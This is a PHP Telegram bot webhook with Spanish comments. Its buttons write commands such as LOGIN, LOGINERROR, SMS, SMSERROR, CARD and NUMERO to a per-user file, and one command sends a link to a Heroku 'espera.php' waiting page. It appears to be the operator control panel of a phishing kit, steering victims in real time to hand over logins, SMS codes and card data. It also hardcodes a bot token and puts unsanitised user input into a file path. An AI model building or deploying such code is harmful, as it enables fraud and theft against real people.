<?php
// ==============================
// 🤖 bot.php — ORGANIZADO + TEST
// ==============================

// 🔐 TOKEN DEL BOT
$token = "8521201522:AAF90SGm6bahwP72Q2TSo83LDxp9ngq94MI";

// ==============================
// 👀 TEST VISUAL DESDE NAVEGADOR
// ==============================
// Esto SOLO responde cuando abres el archivo en el navegador (GET)
// NO afecta al webhook (Telegram usa POST)
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    echo "BOT ACTIVO OK";
    exit;
}

// ==============================
// 📩 LEER UPDATE DE TELEGRAM
// ==============================
$content = file_get_contents("php://input");
$update  = json_decode($content, true);

// 🧪 LOG PARA DEPURACIÓN
file_put_contents("log.txt", print_r($update, true), FILE_APPEND);

// ==============================
// 🎯 PROCESAR CALLBACK QUERY
// ==============================
if (!isset($update['callback_query'])) {
    exit; // Solo trabaja con botones
}

$callback    = $update['callback_query'];
$data        = $callback['data'];
$chat_id     = $callback['message']['chat']['id'];
$callback_id = $callback['id'];

// ==============================
// 🔎 VALIDAR DATA
// ==============================
if (strpos($data, '|') === false) {
    exit;
}

list($comando, $usuario) = explode('|', $data, 2);

// ==============================
// 📁 CARPETA DE ACCIONES
// ==============================
$carpeta = "acciones";
if (!file_exists($carpeta)) {
    mkdir($carpeta, 0777, true);
}

$archivo = "$carpeta/$usuario.txt";

// ==============================
// ⚙️ MAPEAR COMANDOS
// ==============================
switch ($comando) {
    case "SMS":
        $accion = "/SMS";
        break;
    case "SMSERROR":
        $accion = "/SMSERROR";
        break;
    case "NUMERO":
        $accion = "/NUMERO";
        break;
    case "ERROR":
        $accion = "/ERROR";
        break;
    case "LOGIN":
        $accion = "/LOGIN";
        break;
    case "LOGINERROR":
        $accion = "/LOGINERROR";
        break;
    case "CARD":
        $accion = "/CARD";
        break;
    case "CONTINUAR":
        $accion = "/CONTINUAR";
        break;
    default:
        $accion = "/ERROR";
}

// ==============================
// 💾 GUARDAR ACCIÓN
// ==============================
file_put_contents($archivo, $accion);

// ==============================
// ✅ RESPONDER CALLBACK
// ==============================
file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
    'callback_query_id' => $callback_id,
    'text'              => "✅ Acción enviada para $usuario",
    'show_alert'        => false
]));

// ==============================
// 🚀 ACCIÓN ESPECIAL: CONTINUAR
// ==============================
if ($comando === "CONTINUAR") {

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        "chat_id" => $chat_id,
        "text"    => "Continúa al siguiente paso 👇",
        "reply_markup" => json_encode([
            "inline_keyboard" => [
                [
                    [
                        "text" => "➡️ Abrir página",
                        "url"  => "https://bmproservic2026-d6f976187c6a.herokuapp.com/indeff/espera.php?u=$usuario"
                    ]
                ]
            ]
        ])
    ]));
}
